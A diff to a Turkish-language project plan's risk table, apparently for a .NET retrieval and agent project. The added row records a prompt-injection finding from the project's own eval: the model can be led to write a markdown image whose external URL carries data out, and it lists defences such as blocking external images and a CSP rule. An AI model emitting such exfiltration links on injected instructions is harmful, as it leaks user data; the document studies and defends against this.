@@ -195,6 +195,7 @@ Her adımın sonunda `dotnet build` ve `dotnet test` yeşil olmalı. Adım bitin
 | **Hybrid füzyonu** | Connector'ın varsayılan birleştirmesi ya da iki ayrı sorgu ve kendi RRF'imiz | **Karar verildi (ADR-002):** kendi RRF'imiz. Connector'ın keyword tarafı sıralamasız bir filtre; ölçümde connector hybrid Hit@1 5/10, bizim hybrid 10/10 |
 | **NIM rate limit ve trial şartları** | Free tier limitleri belirsiz; trial ToS üretim kullanımı için değil | Eval runner'da eşzamanlılık sınırı ve retry (ServiceDefaults resilience); embedding önbelleği. Portföy için uygun |
 | **Paket değişkenliği** | AF ve MEAI neredeyse haftalık sürüm çıkarıyor | Sürümler `Directory.Packages.props`'ta sabit; 3 hafta boyunca yükseltme yok (güvenlik düzeltmesi hariç) |
+| **Markdown ile veri sızdırma** (2026-11-12, 3.3 injection eval'i, inj-26) | Model, injection'la istenen `![..](https://dış-adres?veri=..)` görselini cevaba yazabiliyor. Arayüz cevabı şu an düz metin gösteriyor (`AnswerText.ToPlain` + Razor kodlaması), yani görsel yüklenmiyor. Markdown gösterimi eklenirse tarayıcı bu adresi çağırır ve veri dışarı gider | **Arayüz markdown göstermeye başlarsa dış görsel URL'leri engellenir:** görseller hiç işlenmez ya da yalnızca uygulamanın kendi adresine izin verilir; bağlantılar da izin listesine bağlanır. Bunu bir test korur (inj-26 türü cevapta dış adrese istek yok). Ek savunma: CSP `img-src 'self'` |
 | **Kapsam** | Haftada yaklaşık 25 saat | Her haftada 1 tampon oturum var. Taşma olursa ilk kesilecekler: 2.6'daki injection genişletmesi, 3.3'teki Completeness metriği, GIF |
 
 ---
